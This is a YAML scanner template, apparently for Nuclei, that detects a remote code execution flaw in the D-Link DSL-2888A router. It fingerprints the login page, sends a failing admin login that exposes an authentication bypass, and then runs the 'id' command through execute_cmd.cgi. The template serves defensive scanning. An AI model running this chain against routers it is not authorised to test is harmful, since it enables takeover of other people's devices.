id: dlink-dsl-2888a-rce
info:
  name: D-Link DSL-2888A Remote Code Execution
  author: ProjectDiscoveryAI
  severity: high
  tags: rce
  description: |
    Detects Remote Code Execution vulnerability in D-Link DSL-2888A router.

http:
  - id: check-login-page
    method: GET
    path:
      - "{{BaseURL}}/page/login/login.html"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "content-type"
      - type: word
        part: header
        words:
          - "text/html"
      - type: word
        part: body
        words:
          - "var ModelName=\"DSL-2888A\";"

  - id: login-authentication
    method: POST
    path:
      - "{{BaseURL}}/"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "username=admin&password=6b86b273ff34fce19d6b804eff5a3f5747ada4eaa22f1d49c01e52ddb7875b4b"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 302
      - type: word
        part: header
        words:
          - "location"
      - type: word
        part: header
        words:
          - "/page/login/login_fail.html"

  - id: execute-command
    method: GET
    path:
      - "{{BaseURL}}/cgi-bin/execute_cmd.cgi?timestamp=1589333279490&cmd=id"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: header
        words:
          - "content-type"
      - type: word
        part: header
        words:
          - "text/html"
      - type: word
        part: body
        words:
          - "uid=0(admin) gid=0(admin)"
